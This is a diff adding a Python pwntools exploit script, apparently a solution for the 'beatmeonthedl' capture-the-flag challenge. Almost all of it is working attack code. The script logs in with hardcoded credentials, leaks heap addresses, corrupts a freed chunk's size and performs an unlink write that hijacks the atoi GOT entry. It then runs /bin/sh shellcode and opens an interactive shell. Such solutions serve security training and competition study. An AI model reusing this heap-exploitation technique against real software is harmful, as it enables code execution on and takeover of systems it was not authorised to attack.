@@ -1,0 +1,100 @@
+#!/usr/bin/env python
+from pwn import *
+
+#p = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', 6969)
+
+p = remote('127.0.0.1', 7122)
+#p = process('./beatmeonthedl')
+#p = debug('./beatmeonthedl')
+#p = attach(10126)
+e = ELF('./beatmeonthedl')
+
+def login():
+	p.recvuntil('Enter username:')
+	p.sendline('mcfly')
+	p.recvuntil('Enter Pass:')
+	p.sendline('awesnap')
+
+def menu():
+	p.recvuntil('|')
+
+def req(s):
+	menu()
+	p.sendline('1')
+	p.recvuntil('>')
+	p.send(s)
+	sleep(0.1)
+
+def pri():
+	menu()
+	p.sendline('2')
+	return p.recvuntil('I', drop=True)
+
+def dele(choice):
+	menu()
+	p.sendline('3')
+	p.recvuntil(':')
+	p.sendline(str(choice))
+
+def cha(choice, s):
+	menu()
+	p.sendline('4')
+	p.recvuntil(':')
+	p.sendline(str(choice))
+	p.recvuntil(':')
+	p.send(s)
+	sleep(0.1)
+
+#p.interactive()
+
+login()
+
+# leak first chunk (shellcode) address
+context.arch='amd64'
+req('\x90'*2+asm(shellcraft.sh()))
+#p.interactive()
+#print pri()
+#p.interactive()
+req('b'*56)
+req('c'*56)
+req('d'*56)
+dele(0)
+dele(2)
+dele(3)
+
+addr = []
+for i in [56, 64, 72]:
+	cha(1, 'A'*i)
+	ret = pri()
+	print i, repr(ret), repr(ret[i+4 : ])
+	addr.append(u64(ret[i+4 : -1].ljust(8, '\x00')))
+
+	#addr[ai] <<= 8
+	#addr[ai] += int(ret[i+4].encode('hex'), 16)
+	#if (i%8) == 7:
+		#ai += 1
+print map(hex, addr)
+#input('')
+
+first_chunk = addr[1]+0x10
+atoi = e.got['atoi']
+print 'got:', hex(atoi)
+bss = e.bss(0x200)
+
+# got hijack
+req('\x90'*2+asm(shellcraft.sh()))
+print repr(pri())
+req('B'*56)
+# fd=atoi->bk    bk=shellcode
+req(p64(atoi-24) + p64(first_chunk))
+# chunksize = -8
+cha(2, 'B'*56 + p64(2**64-8))
+cha(0, '\x90'*21+asm(shellcraft.sh()))
+print 'before delete'
+dele(2)
+print 'after delete'
+raw_input()
+#print repr(pri())
+
+
+p.interactive()
